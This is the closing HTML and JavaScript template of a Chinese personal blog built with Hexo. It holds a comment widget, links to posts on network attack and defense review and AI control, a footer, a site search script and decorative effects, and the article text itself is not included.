</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'KrP8LCvOkNLeKYOzomaIagbA-gzGzoHsz',
        appKey: 'tOTYSpmIAEnlWHbIzwFx73iX',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2022/05/25/2020-5-25-gong-fang-fu-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="网络攻防复习">
                        
                        <span class="card-title">网络攻防复习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CUMT网络攻击与防御课程复习
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CUMT/">
                        <span class="chip bg-color">CUMT</span>
                    </a>
                    
                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">网络安全</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/04/25/2022-4-25-ren-gong-zhi-neng-kong-zhi-fu-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="人工智能控制">
                        
                        <span class="card-title">人工智能控制</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CUMT数学学院人工智能复习
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" class="post-category">
                                    人工智能
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%95%B0%E5%AD%A6/">
                        <span class="chip bg-color">数学</span>
                    </a>
                    
                    <a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/">
                        <span class="chip bg-color">人工智能</span>
                    </a>
                    
                    <a href="/tags/%E6%95%B0%E7%90%86%E9%80%BB%E8%BE%91/">
                        <span class="chip bg-color">数理逻辑</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 秋月日常<br />'
            + '文章作者: LowlyLi<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>



    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2022</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">LowlyLi</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2021";
                    var startMonth = "11";
                    var startDate = "15";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lcy5201314" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:543797538@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=543797538" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 543797538" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/wczxzppxuvj3litzyyta1w2asmyg4dus.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    
    
    <script type="text/javascript" size="150" alpha='0.6'
        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

    <!-- 樱花 -->
    <script type="text/javascript">
        // 只在桌面版网页启用特效
        var windowWidth = $(window).width();
        if (windowWidth > 768) {
            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
        }
    </script>
        


</body>

</html>
